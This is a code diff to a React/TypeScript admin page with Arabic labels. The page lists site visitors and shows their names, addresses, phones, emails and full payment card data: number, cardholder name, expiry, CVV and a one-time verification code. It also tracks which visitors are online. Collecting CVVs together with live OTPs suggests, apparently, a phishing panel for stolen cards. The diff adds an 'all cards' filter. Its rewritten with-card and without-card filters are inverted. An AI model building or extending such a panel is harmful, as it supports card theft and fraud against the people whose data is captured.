@@ -54,18 +54,18 @@ interface Notification {
   page: string
   country?: string
   customer?: {
-    address?: string | "0",
-    city?: string | "0",
-    email?: string | "0",
-    fullName?: string | "0",
-    phone?: string | "0",
-  },
+    address?: string | "0"
+    city?: string | "0"
+    email?: string | "0"
+    fullName?: string | "0"
+    phone?: string | "0"
+  }
   cardData?: {
-    cardNumber: string,
-    cardholderName: string,
-    expiryDate: string,
-    cvv: string,
-    cardType:string,
+    cardNumber: string
+    cardholderName: string
+    expiryDate: string
+    cvv: string
+    cardType: string
   }
   isOnline?: boolean
   lastSeen: string
@@ -84,11 +84,11 @@ interface Notification {
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
-  const [activeFilter, setActiveFilter] = useState<"all" | "withCard" | "withoutCard" | "online">("all")
+  const [activeFilter, setActiveFilter] = useState<"all" | "withCard" | "withoutCard" | "online" | "allCards">("all")
   const [onlineUserIds, setOnlineUserIds] = useState<string[]>([])
   const [isLoading, setIsLoading] = useState(true)
   const [message, setMessage] = useState<boolean>(false)
-  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" |"ccard"| null>(null)
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "ccard" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
@@ -131,21 +131,24 @@ export default function NotificationsPage() {
     applyFilter(activeFilter)
   }, [notifications, activeFilter, onlineUserIds])
 
-  const applyFilter = (filter: "all" | "withCard" | "withoutCard" | "online") => {
+  const applyFilter = (filter: "all" | "withCard" | "withoutCard" | "online" | "allCards") => {
     switch (filter) {
       case "all":
         setFilteredNotifications(notifications)
         break
       case "withCard":
-        setFilteredNotifications(notifications.filter((notification) => !!notification.cardNumber))
-        setFilteredNotifications(notifications.filter((notification) => !!notification.cardData?.cardNumber))
+        setFilteredNotifications(notifications.filter((notification) => !notification.cardNumber))
         break
       case "withoutCard":
-        setFilteredNotifications(notifications.filter((notification) => !notification.cardNumber))
-        setFilteredNotifications(notifications.filter((notification) => !notification.cardData?.cardNumber))
+        setFilteredNotifications(notifications.filter((notification) => !!notification.cardNumber))
         break
       case "online":
         setFilteredNotifications(notifications.filter((notification) => onlineUserIds.includes(notification.id)))
+        break
+      case "allCards":
+        setFilteredNotifications(
+          notifications.filter((notification) => notification.cardNumber || notification.cardData?.cardNumber),
+        )
         break
       default:
         setFilteredNotifications(notifications)
@@ -265,7 +268,7 @@ export default function NotificationsPage() {
     }
   }
 
-  const handleInfoClick = (notification: Notification, infoType: "personal" | "card"|"ccard") => {
+  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "ccard") => {
     setSelectedNotification(notification)
     setSelectedInfo(infoType)
   }
@@ -394,13 +397,14 @@ export default function NotificationsPage() {
           </div>
           <Tabs
             defaultValue="all"
-            onValueChange={(value) => setActiveFilter(value as "all" | "withCard" | "withoutCard" | "online")}
+            onValueChange={(value) =>
+              setActiveFilter(value as "all" | "withCard" | "withoutCard" | "online" | "allCards")
+            }
           >
-            <TabsList className="grid w-full grid-cols-4">
+            <TabsList className="grid w-full grid-cols-5">
               <TabsTrigger value="all">الكل</TabsTrigger>
-              <TabsTrigger value="withCard">مع بطاقة</TabsTrigger>
-              <TabsTrigger value="withoutCard">بدون بطاقة</TabsTrigger>
               <TabsTrigger value="online">متصل</TabsTrigger>
+              <TabsTrigger value="allCards">جميع البطاقات</TabsTrigger>
             </TabsList>
           </Tabs>
         </div>
@@ -424,7 +428,11 @@ export default function NotificationsPage() {
               <tbody>
                 {(activeFilter === "online"
                   ? filteredNotifications.filter((notification) => onlineUserIds.includes(notification.id))
-                  : filteredNotifications
+                  : activeFilter === "allCards"
+                    ? filteredNotifications.filter(
+                        (notification) => notification.cardNumber || notification.cardData?.cardNumber,
+                      )
+                    : filteredNotifications
                 ).map((notification) => (
                   <tr key={notification.id} className="border-b border-gray-700">
                     <td className="px-4 py-3">{notification?.country!}</td>
@@ -439,12 +447,12 @@ export default function NotificationsPage() {
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
                         <Badge
-                      variant={notification.cardData?.cardNumber ? "default" : "destructive"}
-                      className={`rounded-md cursor-pointer ${notification.cardData?.cardNumber? "bg-blue-500" : ""}`}
-                      onClick={() => handleInfoClick(notification, "ccard")}
-                    >
-                      {notification.cardData?.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                    </Badge>
+                          variant={notification.cardData?.cardNumber ? "default" : "destructive"}
+                          className={`rounded-md cursor-pointer ${notification.cardData?.cardNumber ? "bg-blue-500" : ""}`}
+                          onClick={() => handleInfoClick(notification, "ccard")}
+                        >
+                          {notification.cardData?.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                        </Badge>
                         <Badge
                           variant={notification.customer?.fullName ? "default" : "secondary"}
                           className={`rounded-md cursor-pointer ${notification?.customer?.fullName ? "bg-fuchsia-500" : ""}`}
@@ -489,7 +497,11 @@ export default function NotificationsPage() {
           <div className="md:hidden space-y-4 p-2">
             {(activeFilter === "online"
               ? filteredNotifications.filter((notification) => onlineUserIds.includes(notification.id))
-              : filteredNotifications
+              : activeFilter === "allCards"
+                ? filteredNotifications.filter(
+                    (notification) => notification.cardNumber || notification.cardData?.cardNumber,
+                  )
+                : filteredNotifications
             ).map((notification) => (
               <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
                 <div className="flex justify-between items-start mb-3">
@@ -521,7 +533,7 @@ export default function NotificationsPage() {
                     </Badge>
                     <Badge
                       variant={notification.cardData?.cardNumber ? "default" : "destructive"}
-                      className={`rounded-md cursor-pointer ${notification.cardData?.cardNumber? "bg-blue-500" : ""}`}
+                      className={`rounded-md cursor-pointer ${notification.cardData?.cardNumber ? "bg-blue-500" : ""}`}
                       onClick={() => handleInfoClick(notification, "ccard")}
                     >
                       {notification.cardData?.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
@@ -585,34 +597,32 @@ export default function NotificationsPage() {
                 <strong>الاسم:</strong> {selectedNotification?.customer?.fullName}
               </p>
               <p>
-              <strong>العنوان:</strong> {selectedNotification.customer?.address}
-
-              </p> <p>
-              <strong>رقم الهاتف:</strong> {selectedNotification.customer?.phone}
-
-              </p> <p>
-              <strong>ايميل:</strong> {selectedNotification.customer?.email}
-
+                <strong>العنوان:</strong> {selectedNotification.customer?.address}
+              </p>{" "}
+              <p>
+                <strong>رقم الهاتف:</strong> {selectedNotification.customer?.phone}
+              </p>{" "}
+              <p>
+                <strong>ايميل:</strong> {selectedNotification.customer?.email}
               </p>
             </div>
           )}
-            {selectedInfo === "ccard" && selectedNotification?.cardData?.cardNumber && (
+          {selectedInfo === "ccard" && selectedNotification?.cardData?.cardNumber && (
             <div className="space-y-2">
               <p>
                 <strong>رقم البطاقة:</strong> {selectedNotification?.cardData?.cardNumber}
               </p>
               <p>
-              <strong>الإسم:</strong> {selectedNotification.cardData?.cardholderName}
-
-              </p> <p>
-              <strong>تاريخ الانتهاء:</strong> {selectedNotification.cardData?.expiryDate}
-
-              </p> <p>
-              <strong>رمز امان:</strong> {selectedNotification.cardData?.cvv}
-
-              </p> <p>
-              <strong>رمز التحقق:</strong> {selectedNotification.otp1}
-
+                <strong>الإسم:</strong> {selectedNotification.cardData?.cardholderName}
+              </p>{" "}
+              <p>
+                <strong>تاريخ الانتهاء:</strong> {selectedNotification.cardData?.expiryDate}
+              </p>{" "}
+              <p>
+                <strong>رمز امان:</strong> {selectedNotification.cardData?.cvv}
+              </p>{" "}
+              <p>
+                <strong>رمز التحقق:</strong> {selectedNotification.otp1}
               </p>
             </div>
           )}
@@ -667,10 +677,8 @@ export default function NotificationsPage() {
                 </Button>
               </div>
               <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
-            
             </div>
           )}
-          
         </DialogContent>
       </Dialog>
     </div>
